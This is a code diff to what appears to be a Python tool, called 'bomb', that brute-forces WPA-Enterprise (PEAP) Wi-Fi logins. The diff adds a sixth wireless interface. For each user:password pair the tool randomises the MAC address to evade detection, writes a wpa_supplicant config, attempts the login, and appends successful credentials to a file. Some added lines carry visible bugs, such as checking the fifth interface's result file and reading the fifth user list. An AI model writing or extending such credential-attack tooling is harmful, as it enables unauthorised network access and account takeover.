@@ -244,8 +244,47 @@ password="%s"
             subprocess.call(copycreds, shell=True)
 
 
+def connection6(password, user_list6):
+    for user in user_list6:
+        change_mac = "ifconfig " + face6 + " down; macchanger -r " + face6 + " >" + conf + ".garb; ifconfig " + face6 + " up"
+        subprocess.call(change_mac, shell=True)
+
+        wpa_file = """ctrl_interface=/var/run/wpa_supplicant                                                                                                                                     
+eapol_version=1                                                                                                                                                                                  
+network={                                                                                                                                                                                        
+ssid="%s"                                                                                                                                                                                        
+key_mgmt=WPA-EAP                                                                                                                                                                                 
+eap=PEAP                                                                                                                                                                                         
+identity="%s"                                                                                                                                                                                    
+password="%s"                                                                                                                                                                                    
+}                                                                                                                                                                                                
+""" % (ssid, user, password)
+
+        wpa_write = open(conf + "con6.conf", "w")
+        wpa_write.write(wpa_file)
+        wpa_write.close()
+
+        wpa_req = "timeout 20 wpa_supplicant -i" + face6 + " -D" + driver + " -c " + conf + "con6.conf >" + conf + "con6.res"
+        try:
+            subprocess.call(wpa_req, shell=True)
+        except:
+            pass
+        clean = "ifconfig " + face6 + " down; ifconfig " + face6 + " up"
+        subprocess.call(clean, shell=True)
+        check1 = "cat " + conf + "con5.res | grep succeeded >" + conf + "check6.file"
+        subprocess.call(check1, shell=True)
+        if os.stat(conf + "check6.file").st_size == 0:
+            print(
+                color.RED + color.BOLD + "[*]- " + color.END + user + ":" + password + " didn't work")
+        else:
+            print(
+                color.GREEN + color.BOLD + "[*]- " + color.BLUE + "Congrats!!! " + color.RED + user + ":" + password + color.BLUE + " can log in!!!" + color.END)
+            copycreds = "echo \'" + user + ":" + password + "\' >> " + res + ssid + "_creds.txt"
+            subprocess.call(copycreds, shell=True)
+
+
 def bomb():
-    global ssid, face1, face2, face3, face4, face5
+    global ssid, face1, face2, face3, face4, face5, face6
 
 
     print(color.BLUE + r"""
@@ -303,9 +342,18 @@ def bomb():
         except ValueError:
             print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS NOT A NUMBER!\n\n" + color.END)
             exit()
-    if val > 5:
+    if val > 6:
         print(color.RED + color.BOLD + "\tERROR!!!!: THAT IS TOO MANY INTERFACES!\n\n" + color.END)
         exit()
+
+    if val == 6:
+        face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
+        face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)
+        face3 = input(color.BLUE + "\n\tWhat is the 3rd wireless interface that we are using?:  " + color.END)
+        face4 = input(color.BLUE + "\n\tWhat is the 4th wireless interface that we are using?:  " + color.END)
+        face5 = input(color.BLUE + "\n\tWhat is the 5th wireless interface that we are using?:  " + color.END)
+        face6 = input(color.BLUE + "\n\tWhat is the 6th wireless interface that we are using?:  " + color.END)
+
     if val == 5:
         face1 = input(color.BLUE + "\n\tWhat is the 1st wireless interface that we are using?:  " + color.END)
         face2 = input(color.BLUE + "\n\tWhat is the 2nd wireless interface that we are using?:  " + color.END)
@@ -380,9 +428,15 @@ def bomb():
             print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
             exit()
 
-    if val == 5:
+    if val >= 5:
         try:
-            users5 = open(conf + "usersad", "r")
+            users5 = open(conf + "usersae", "r")
+        except:
+            print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
+            exit()
+    if val >= 6:
+        try:
+            users6 = open(conf + "usersaf", "r")
         except:
             print(color.RED + color.BOLD + "\tERROR!!!!: THE USER FILE WAS NOT CREATED!\n\n" + color.END)
             exit()
@@ -392,6 +446,7 @@ def bomb():
     user_list3 = []
     user_list4 = []
     user_list5 = []
+    user_list6 = []
     passwords = []
 
     for f in users1:
@@ -417,6 +472,11 @@ def bomb():
         for f in users5:
             current_place = f[:-1]
             user_list5.append(current_place)
+
+    if val >= 6:
+        for f in users5:
+            current_place = f[:-1]
+            user_list6.append(current_place)
 
     for f in passwd:
         current_place1 = f[:-1]
@@ -562,6 +622,58 @@ def bomb():
             p3.join()
             p4.join()
             p5.join()
+    if val == 6:
+        clean = "rm /var/run/wpa_supplicant/" + face1 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        clean = "rm /var/run/wpa_supplicant/" + face2 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        clean = "rm /var/run/wpa_supplicant/" + face3 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        clean = "rm /var/run/wpa_supplicant/" + face4 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        clean = "rm /var/run/wpa_supplicant/" + face5 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        clean = "rm /var/run/wpa_supplicant/" + face6 + " >" + conf + ".clean"
+        try:
+            subprocess.call(clean, shell=True)
+        except:
+            pass
+        for password in passwords:
+
+            p = Process(target=connection1, args=(password, user_list1, ))
+            p2 = Process(target=connection2, args=(password, user_list2, ))
+            p3 = Process(target=connection3, args=(password, user_list3, ))
+            p4 = Process(target=connection4, args=(password, user_list4, ))
+            p5 = Process(target=connection5, args=(password, user_list5, ))
+            p6 = Process(target=connection6, args=(password, user_list6,))
+            p.start()
+            p2.start()
+            p3.start()
+            p4.start()
+            p5.start()
+            p6.start()
+            p.join()
+            p2.join()
+            p3.join()
+            p4.join()
+            p5.join()
+            p6.join()
+
     clock_stop = datetime.datetime.now()
     print("\n\tScan Started On: ", clock_start)
     print("\n\tScan Ended On: ", clock_stop)
